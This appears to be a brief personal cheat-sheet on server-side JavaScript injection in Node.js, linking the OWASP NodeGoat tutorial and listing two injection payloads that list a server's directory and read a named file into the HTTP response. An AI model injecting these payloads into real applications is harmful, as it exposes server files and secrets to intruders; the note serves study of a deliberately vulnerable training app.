#code_injection  #nodejs

## Resource
https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_server_side_js_injection.html 


## List directory content
```node
res.end(require('fs').readdirSync('.').toString())
```


## Read File
```node
res.end(require('fs').readFileSync(filename))
```
